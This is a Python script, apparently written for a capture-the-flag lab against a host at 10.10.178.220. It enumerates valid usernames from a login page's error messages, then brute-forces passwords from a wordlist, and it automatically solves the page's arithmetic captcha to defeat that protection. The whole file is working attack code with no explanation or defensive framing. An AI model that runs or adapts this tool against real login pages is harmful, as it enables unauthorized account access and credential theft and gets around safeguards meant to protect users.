import requests
from bs4 import BeautifulSoup
import re
def main():
    url = "http://10.10.178.220/login"
    with open ("usernames.txt", "r") as file:
        usernames=file.readlines()
    with open ("passwords.txt", "r") as passwd:
        passwords = passwd.readlines()
    params = {"username": "username", "password": "password"}
    response = requests.post(url, data=params)
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find_all(string='Captcha enabled'):
        captcha_terms = soup.form.br.next_sibling.strip().split()[0:3]
        captcha_result=solve_captcha(captcha_terms)
        params["captcha"] = f'{captcha_result}'
    for username in usernames:
        username = username.strip()
        params["username"] = username
        response = requests.post(url, data=params)
        soup = BeautifulSoup(response.text, 'html.parser')
        print(f" Current User Try: {username}", end='\r', flush=True)
        error_message = soup.div.p.strong.text + soup.div.p.strong.next_sibling
        if soup.find_all(string='Captcha enabled'):
            captcha_terms = soup.form.br.next_sibling.strip().split()[0:3]
            captcha_result=solve_captcha(captcha_terms)
            params["captcha"] = f'{captcha_result}'
        if re.search("password", error_message) != None:
            print('  ' *  20, end='\r', flush=True)
            print(f"Username found: {username}")
            for password in passwords:
                password= password.strip()
                params["password"]=password
                response = requests.post(url, data=params)
                soup = BeautifulSoup(response.text, 'html.parser')
                print(f" Current Password Try: {password}", end='\r', flush=True)
                try:
                    error_message = soup.div.p.strong.text + soup.div.p.strong.next_sibling
                except:
                    print('  ' *  20, end='\r', flush=True)
                    print (f"Password found: {password}")
                    exit()
                if soup.find_all(string='Captcha enabled'):
                    captcha_terms = soup.form.br.next_sibling.strip().split()[0:3]
                    captcha_result=solve_captcha(captcha_terms)
                    params["captcha"] = f'{captcha_result}'
def solve_captcha(captcha_callenge):
    first_term = int(captcha_callenge[0])
    operator = str(captcha_callenge[1])
    second_term = int(captcha_callenge[2])
    if operator=="+":
            return first_term + second_term
    elif operator=="-":
        return first_term-second_term
    elif operator=="*":
        return first_term*second_term        
if __name__ =='__main__':
    main()



